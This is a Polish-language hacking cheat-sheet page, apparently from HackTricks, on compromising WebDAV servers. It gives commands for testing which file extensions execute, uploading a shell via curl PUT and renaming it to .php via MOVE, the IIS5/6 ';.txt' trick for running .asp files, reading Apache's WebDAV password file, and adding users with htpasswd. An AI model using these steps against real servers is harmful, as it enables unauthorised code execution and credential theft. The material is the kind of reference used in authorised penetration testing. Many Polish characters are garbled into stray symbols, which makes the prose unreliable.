# WebDav

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
U偶yj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav), aby atwo budowa i **automatyzowa przepywy pracy** zasilane przez **najbardziej zaawansowane** narzdzia spoecznociowe na wiecie.\
Uzyskaj dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}

{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegram**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w github.

</details>
{% endhint %}
{% endhint %}

Podczas pracy z **serwerem HTTP z wczonym WebDav** mo偶liwe jest **manipulowanie plikami**, jeli masz odpowiednie **powiadczenia**, zazwyczaj weryfikowane przez **HTTP Basic Authentication**. Uzyskanie kontroli nad takim serwerem czsto wi偶e si z **przesyaniem i uruchamianiem webshella**.

Dostp do serwera WebDav zazwyczaj wymaga **wa偶nych powiadcze**, a [**bruteforce WebDav**](../../generic-methodologies-and-resources/brute-force.md#http-basic-auth) jest powszechn metod ich zdobywania.

Aby obej ograniczenia dotyczce przesyania plik贸w, szczeg贸lnie te uniemo偶liwiajce wykonywanie skrypt贸w po stronie serwera, mo偶esz:

* **Przesa** pliki z **wykonywalnymi rozszerzeniami** bezporednio, jeli nie s ograniczone.
* **Zmie nazw** przesanych plik贸w niewykonywalnych (np. .txt) na rozszerzenie wykonywalne.
* **Skopiowa** przesane pliki niewykonywalne, zmieniajc ich rozszerzenie na takie, kt贸re jest wykonywalne.

## DavTest

**Davtest** pr贸buje **przesa kilka plik贸w z r贸偶nymi rozszerzeniami** i **sprawdza**, czy rozszerzenie jest **wykonywane**:
```bash
davtest [-auth user:password] -move -sendbd auto -url http://<IP> #Uplaod .txt files and try to move it to other extensions
davtest [-auth user:password] -sendbd auto -url http://<IP> #Try to upload every extension
```
![](<../../.gitbook/assets/image (851).png>)

To nie oznacza, 偶e **rozszerzenia .txt** i **.html s wykonywane**. To oznacza, 偶e mo偶esz **uzyska dostp do tych plik贸w** przez sie.

## Cadaver

Mo偶esz u偶y tego narzdzia, aby **poczy si z serwerem WebDav** i wykona akcje (takie jak **przesyanie**, **przenoszenie** lub **usuwanie**) **rcznie**.
```
cadaver <IP>
```
## 呕danie PUT
```
curl -T 'shell.txt' 'http://$ip'
```
## 呕danie MOVE
```
curl -X MOVE --header 'Destination:http://$ip/shell.php' 'http://$ip/shell.txt'
```
<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
U偶yj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav), aby atwo budowa i **automatyzowa przepywy pracy** zasilane przez **najbardziej zaawansowane** narzdzia spoecznociowe na wiecie.\
Uzyskaj dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}

## Luka w WebDav IIS5/6

Ta luka jest bardzo interesujca. **WebDav** **nie pozwala** na **przesyanie** ani **zmienianie nazw** plik贸w z rozszerzeniem **.asp**. Ale mo偶esz **obej** to, **dodajc** na kocu nazwy **";.txt"**, a plik zostanie **wykonany** tak, jakby by plikiem .asp (mo偶esz r贸wnie偶 **u偶y ".html" zamiast ".txt"**, ale **NIE zapomnij o ";"**).

Nastpnie mo偶esz **przesa** sw贸j shell jako plik ".**txt"** i **skopiowa/przenie go do pliku ".asp;.txt"**. Uzyskujc dostp do tego pliku przez serwer WWW, zostanie on **wykonany** (cadaver powie, 偶e akcja przeniesienia nie powioda si, ale tak nie jest).

![](<../../.gitbook/assets/image (1092).png>)

## Powiadczenia post

Jeli Webdav u偶ywa serwera Apache, powiniene sprawdzi skonfigurowane witryny w Apache. Zwykle:\
_**/etc/apache2/sites-enabled/000-default**_

Wewntrz mo偶esz znale藕 co takiego:
```
ServerAdmin webmaster@localhost
Alias /webdav /var/www/webdav
<Directory /var/www/webdav>
DAV On
AuthType Digest
AuthName "webdav"
AuthUserFile /etc/apache2/users.password
Require valid-user
```
Jak wida, s pliki z wa偶nymi **credentials** dla serwera **webdav**:
```
/etc/apache2/users.password
```
Wewntrz tego typu plik贸w znajdziesz **nazwa u偶ytkownika** oraz **hash** hasa. To s dane uwierzytelniajce, kt贸re serwer webdav u偶ywa do uwierzytelniania u偶ytkownik贸w.

Mo偶esz spr贸bowa je **zama**, lub **doda wicej**, jeli z jakiego powodu chcesz **uzyska dostp** do serwera **webdav**:
```bash
htpasswd /etc/apache2/users.password <USERNAME> #You will be prompted for the password
```
Aby sprawdzi, czy nowe dane uwierzytelniajce dziaaj, mo偶esz zrobi:
```bash
wget --user <USERNAME> --ask-password http://domain/path/to/webdav/ -O - -q
```
## References

* [https://vk9-sec.com/exploiting-webdav/](https://vk9-sec.com/exploiting-webdav/)
{% hint style="success" %}
Ucz si i wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz si i wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* Sprawd藕 [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **Docz do**  [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **led藕** nas na **Twitterze**  [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel si trikami hackingowymi, przesyajc PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytori贸w na githubie.

</details>
{% endhint %}
</details>
{% endhint %}

<figure><img src="../../.gitbook/assets/image (48).png" alt=""><figcaption></figcaption></figure>

\
U偶yj [**Trickest**](https://trickest.com/?utm_source=hacktricks&utm_medium=text&utm_campaign=ppc&utm_content=put-method-webdav), aby atwo budowa i **automatyzowa przepywy pracy** zasilane przez **najbardziej zaawansowane** narzdzia spoecznociowe na wiecie.\
Uzyskaj dostp ju偶 dzi:

{% embed url="https://trickest.com/?utm_source=hacktricks&utm_medium=banner&utm_campaign=ppc&utm_content=put-method-webdav" %}
